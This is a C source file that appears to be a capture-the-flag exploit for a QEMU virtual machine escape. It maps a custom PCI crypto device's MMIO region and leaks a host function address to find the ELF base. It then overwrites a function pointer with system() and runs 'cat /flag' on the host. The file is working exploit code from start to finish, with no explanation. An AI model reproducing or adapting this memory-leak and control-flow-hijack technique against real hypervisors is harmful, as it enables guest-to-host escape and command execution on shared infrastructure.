#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include<sys/io.h>

uint32_t mmio_size = 0x1000;

unsigned char* mmio_mem;

void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

void mmio_write(uint32_t addr, uint8_t value)
{
    *((uint8_t *)(mmio_mem + addr)) = value;
}

uint8_t mmio_read(uint32_t addr)
{
    return *((uint8_t*)(mmio_mem + addr));
}

void set_statu(uint8_t value)
{
    mmio_read(0x800+1);
    mmio_write(0,value);
}
void set_cryptfunc(){
    set_statu(3);
    mmio_write(0,0);
}
void call_cryptfunc(){
    set_statu(3);
    mmio_read(0);
}
void set_mode(uint8_t value){
    set_statu(2);
    mmio_write(0,value);
}
void set_key(uint32_t addr, uint8_t value)
{
    mmio_read(0x800+1);
    mmio_write(addr+0x800,value);
}
void set_input(uint32_t addr, uint8_t value)
{
    set_statu(2);
    mmio_write(addr+0x800+0x80,value);
}
void reset(){
    mmio_read(0x800+2);
}
char get_key(uint32_t addr){
    set_statu(1);
    return mmio_read(addr+0x800+0x10);
}
char get_input(uint32_t addr){
    set_statu(2);
    return mmio_read(addr+0x800+0x90);
}
char get_output(uint32_t addr){
    set_statu(3);
    return mmio_read(addr+0x800+0x110);
}

int main(int argc, char *argv[])
{
    int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource4", O_RDWR | O_SYNC);
    if (fd == -1)
        die("mmio_fd open failed");
    mmio_mem = mmap( NULL, mmio_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd,0 );
    if ( !mmio_mem ) {
        die("mmap mmio failed");
    }

    //Step1: leak func addr
    char buf[0x10]={0};
    set_key(0,0x41);
    for(int i=0;i<0x80;i++){
        set_input(i,0x62);
    }
    set_cryptfunc();
    set_mode(1);
    call_cryptfunc();//0x4FA2D2
    for(int i=0;i<8;i++){
        buf[i] = get_output(i+0x80);
    }
    size_t elf_base = *((size_t*)buf) - 0x4fa470;
    printf("ELF base = %p\n",elf_base);
    size_t system = elf_base+0x2A6BB0;

    //Step2: change func ptr -> system
    set_key(0,0x1);
    set_key(1,0x2);
    set_key(2,0x3);
    set_key(3,0x4);
    set_key(4,0x5);
    set_key(5,0x6);
    size_t tmp_addr = system^0x0201060504030201^0x0403020106050403;
    for(int i=0;i<0x8;i++){
        uint8_t tmp= tmp_addr>>(i*8);
        set_input(i,tmp);
    }
    call_cryptfunc();

    //Step3：write cat /flag to key
    set_key(0,0x63);
    set_key(1,0x61);
    set_key(2,0x74);
    set_key(3,0x20);
    set_key(4,0x2f);
    set_key(5,0x66);
    set_key(6,0x6c);
    set_key(7,0x61);
    set_key(8,0x67);
    call_cryptfunc();
    return 0;
}